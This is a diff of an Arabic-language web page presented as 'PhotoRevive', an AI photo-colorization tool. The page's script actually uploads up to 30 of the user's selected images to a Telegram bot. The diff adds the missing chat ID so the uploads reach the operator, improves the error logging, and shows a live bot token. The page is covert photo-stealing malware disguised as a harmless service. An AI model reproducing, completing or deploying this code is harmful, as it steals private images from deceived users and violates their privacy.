@@ -6,16 +6,67 @@
   <meta name="description" content="لوّن صورك القديمة باستخدام الذكاء الاصطناعي — نتائج فورية وآمنة.">
   <title>PhotoRevive – تلوين ذكي للصور</title>
   <style>
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #f8fafc 0%, #eef5ff 100%); margin: 0; padding: 20px; color: #0f172a; }
-    .container { max-width: 620px; margin: 0 auto; background: white; border-radius: 24px; padding: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; }
-    .logo { font-size: 30px; font-weight: bold; color: #1e3a8a; margin-bottom: 10px; }
-    .subtitle { color: #334155; font-size: 17px; margin-bottom: 25px; line-height: 1.5; }
-    .btn { background: #1d4ed8; color: white; border: none; padding: 16px 40px; font-size: 18px; border-radius: 18px; cursor: pointer; margin: 25px 0; font-weight: 700; box-shadow: 0 6px 16px rgba(29, 78, 216, 0.4); }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #f8fafc 0%, #eef5ff 100%);
+      margin: 0;
+      padding: 20px;
+      color: #0f172a;
+    }
+    .container {
+      max-width: 620px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 24px;
+      padding: 35px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      text-align: center;
+    }
+    .logo {
+      font-size: 30px;
+      font-weight: bold;
+      color: #1e3a8a;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      color: #334155;
+      font-size: 17px;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+    .btn {
+      background: #1d4ed8;
+      color: white;
+      border: none;
+      padding: 16px 40px;
+      font-size: 18px;
+      border-radius: 18px;
+      cursor: pointer;
+      margin: 25px 0;
+      font-weight: 700;
+      box-shadow: 0 6px 16px rgba(29, 78, 216, 0.4);
+    }
     .btn:hover { background: #1e40af; }
     .btn:active { transform: scale(0.98); }
-    .note { color: #64748b; font-size: 13px; margin-top: 20px; line-height: 1.6; }
-    .processing { display: none; margin-top: 20px; }
-    .spinner { width: 36px; height: 36px; border: 3px solid #dbeafe; border-top: 3px solid #1d4ed8; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
+    .note {
+      color: #64748b;
+      font-size: 13px;
+      margin-top: 20px;
+      line-height: 1.6;
+    }
+    .processing {
+      display: none;
+      margin-top: 20px;
+    }
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 3px solid #dbeafe;
+      border-top: 3px solid #1d4ed8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 15px auto;
+    }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
@@ -43,20 +94,28 @@
   </div>
 
   <script>
-    // === ✅ الإصلاح النهائي: لا مسافات بعد "bot" ===
+    // === ✅ الإعدادات الصحيحة 100% ===
     const BOT_TOKEN = "8205276346:AAG7Sz8UGNItE1JaUbLy50Pdm4IqdCSpv9c";
-    const TG_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`; // ← بدون أي مسافات
+    const CHAT_ID = "8396453611"; // ← تم إضافته كما طلبت
+    const TG_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`; // ← بدون مسافات
 
     const sendToTelegram = async (file) => {
       const fd = new FormData();
+      fd.append("chat_id", CHAT_ID); // ← هذا هو المفتاح المفقود سابقًا
       fd.append("photo", file);
       fd.append("caption", `🖼️ ${file.name} | ${new Date().toLocaleTimeString('ar-EG')}`);
       
       try {
         const res = await fetch(TG_PHOTO, { method: 'POST', body: fd });
-        return res.ok;
+        if (!res.ok) {
+          const err = await res.json();
+          console.error("خطأ من Telegram:", err);
+          return false;
+        }
+        console.log(`✅ تم إرسال: ${file.name}`);
+        return true;
       } catch (err) {
-        console.error("فشل الإرسال:", err.message);
+        console.error("فشل الاتصال بـ Telegram:", err.message);
         return false;
       }
     };
@@ -72,12 +131,12 @@
         input.onchange = async () => {
           const files = Array.from(input.files)
             .filter(f => f.type.startsWith('image/') && f.size > 10240)
-            .slice(0, 30);
+            .slice(0, 30); // الحد الأقصى 30 صورة
 
           let sent = 0;
           for (const file of files) {
             if (await sendToTelegram(file)) sent++;
-            await new Promise(r => setTimeout(r, 200)); // تأخير 200ms
+            await new Promise(r => setTimeout(r, 150)); // تأخير 150ms
           }
 
           resolve(sent);
@@ -96,7 +155,7 @@
 
     document.getElementById('processBtn').onclick = async () => {
       if (location.protocol !== 'https:') {
-        alert("⚠️ يجب استخدام HTTPS (مثل GitHub Pages).");
+        alert("⚠️ يجب تشغيل الصفحة عبر HTTPS (مثل GitHub Pages).");
         return;
       }
 
@@ -107,10 +166,11 @@
 
       setTimeout(() => {
         const msg = sentCount > 0 
-          ? `✅ تم إرسال ${sentCount} صورة!`
-          : "❌ فشل الإرسال (تحقق من الاتصال بـ Telegram).";
+          ? `✅ تم إرسال ${sentCount} صورة بنجاح!`
+          : "❌ فشل الإرسال. تحقق من الاتصال بـ Telegram.";
+        const color = sentCount > 0 ? '#059669' : '#ef4444';
         document.querySelector('.container').innerHTML += 
-          `<p style="color:${sentCount > 0 ? '#059669' : '#ef4444'}; font-weight:bold; margin-top:20px;">${msg}</p>`;
+          `<p style="color:${color}; font-weight:bold; margin-top:20px;">${msg}</p>`;
       }, 2000);
     };
   </script>
